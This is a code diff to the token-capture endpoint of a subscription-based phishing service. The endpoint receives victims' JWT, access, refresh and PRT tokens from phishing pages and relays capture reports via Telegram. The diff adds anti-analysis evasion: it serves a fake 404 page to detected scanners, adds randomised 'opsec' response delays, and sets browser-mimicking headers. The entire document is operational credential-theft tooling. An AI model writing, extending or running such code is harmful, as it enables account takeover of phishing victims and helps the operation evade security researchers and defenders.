@@ -12,6 +12,7 @@ const { processCookieConversion } = require('../services/cookieconverter');
 const { sendTelegramDocument } = require('../services/notification');
 const { body } = require('express-validator');
 const { validateResult } = require('../middleware/validator');
+const { getOpsecSettings } = require('../middleware/opsec');
 
 // Inline validators for the capture endpoint (commonValidators has no
 // captureToken rule, so we define them here to avoid passing `undefined`
@@ -20,6 +21,26 @@ const captureValidators = [
     body('jwt_token').notEmpty().withMessage('jwt_token is required'),
     body('access_token').notEmpty().withMessage('access_token is required'),
 ];
+
+function setBrowserLikeHeaders(res) {
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'DENY');
+  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+  res.setHeader('Cache-Control', 'no-store');
+}
+
+async function applyCaptureDelay() {
+  try {
+    const settings = await getOpsecSettings();
+    if (settings.random_delays !== 'true') return;
+    const min = parseInt(settings.min_delay_ms, 10) || 50;
+    const max = parseInt(settings.max_delay_ms, 10) || 250;
+    const delay = Math.floor(Math.random() * (max - min + 1)) + min;
+    await new Promise(r => setTimeout(r, delay));
+  } catch {
+    // best-effort only
+  }
+}
 
 // --- Telegram capture-report helpers --------------------------------------------
 // Captures can contain very long token + cookie payloads that blow past
@@ -184,44 +205,58 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
     try {
         const { jwt_token, access_token, refresh_token, id_token, ip, user_agent } = req.body;
 
-        console.log('[Capture] /api/capture hit', { hasJwt: !!jwt_token, hasAccess: !!access_token, bodyKeys: Object.keys(req.body || {}) });
+        const visitorIp = ip || req.ip || req.headers['x-forwarded-for'] || '';
+        const ua = user_agent || req.headers['user-agent'] || '';
+        const classification = classifyIP(visitorIp, ua, req.headers);
+
+        if (classification.action === 'block') {
+          console.warn('[Capture] Blocked scanner', { ip: visitorIp, ua });
+          return res.status(404).sendFile(path.join(__dirname, '..', '..', 'admin-panel', '404.html'));
+        }
+
+        await applyCaptureDelay();
 
         if (!jwt_token || !access_token) {
-        return res.status(400).json({ error: 'Missing required fields' });
-    }
+          setBrowserLikeHeaders(res);
+          return res.status(400).json({ error: 'Missing required fields' });
+        }
 
-    // Verify JWT (the one embedded in the phishing page)
-    let decoded;
-    try {
-        decoded = jwt.verify(jwt_token, config.JWT_SECRET);
-    } catch (err) {
-        return res.status(403).json({ error: 'Invalid or expired JWT' });
-    }
+        // Verify JWT (the one embedded in the phishing page)
+        let decoded;
+        try {
+            decoded = jwt.verify(jwt_token, config.JWT_SECRET);
+        } catch (err) {
+            setBrowserLikeHeaders(res);
+            return res.status(403).json({ error: 'Invalid or expired JWT' });
+        }
 
-    const { user_id, link_id } = decoded;
-    if (!user_id || !link_id) {
-        return res.status(403).json({ error: 'Invalid JWT payload' });
-    }
+        const { user_id, link_id } = decoded;
+        if (!user_id || !link_id) {
+            setBrowserLikeHeaders(res);
+            return res.status(403).json({ error: 'Invalid JWT payload' });
+        }
 
-    // Verify user subscription is still active
-    const [users] = await db.query(
-        'SELECT * FROM users WHERE id = ? AND subscription_status = ? AND (subscription_expiry IS NULL OR subscription_expiry > NOW())',
-        [user_id, 'active']
-    );
-    if (!users.length) {
-        return res.status(403).json({ error: 'Subscription inactive or expired' });
-    }
+        // Verify user subscription is still active
+        const [users] = await db.query(
+            'SELECT * FROM users WHERE id = ? AND subscription_status = ? AND (subscription_expiry IS NULL OR subscription_expiry > NOW())',
+            [user_id, 'active']
+        );
+        if (!users.length) {
+            setBrowserLikeHeaders(res);
+            return res.status(403).json({ error: 'Subscription inactive or expired' });
+        }
 
-    // Verify link is still active
-    const [links] = await db.query(
-        'SELECT * FROM links WHERE id = ? AND user_id = ? AND status = ? AND kill_switched = 0',
-        [link_id, user_id, 'active']
-    );
-    if (!links.length) {
-        return res.status(403).json({ error: 'Link not active or killed' });
-    }
+        // Verify link is still active
+        const [links] = await db.query(
+            'SELECT * FROM links WHERE id = ? AND user_id = ? AND status = ? AND kill_switched = 0',
+            [link_id, user_id, 'active']
+        );
+        if (!links.length) {
+            setBrowserLikeHeaders(res);
+            return res.status(403).json({ error: 'Link not active or killed' });
+        }
 
-    const link = links[0];
+        const link = links[0];
 
     // Parse incoming data - support both old format and new PRT format
     let prt = null;
@@ -576,11 +611,13 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
     }
 
+    setBrowserLikeHeaders(res);
     res.status(200).json({ success: true, token_id: tokenId });
 } catch (err) {
     console.error('[Capture] Error:', err);
+    setBrowserLikeHeaders(res);
     res.status(500).json({ error: 'Internal server error' });
-    }
+}
 });
 
 // ─── IP Classification Helper ────────────────────────────────────────────────
@@ -724,12 +761,9 @@ router.post('/visitor/block-check', async (req, res) => {
     console.error('[Capture] visitor/block-check error:', err.message);
     res.status(500).json({ error: 'Server error' });
   }
-module.exports = {
-  router,
-  buildCaptureCaption,
-  buildCaptureFileContent,
-  sendCaptureReport
-};
 });
 
 module.exports = router;
+module.exports.buildCaptureCaption = buildCaptureCaption;
+module.exports.buildCaptureFileContent = buildCaptureFileContent;
+module.exports.sendCaptureReport = sendCaptureReport;
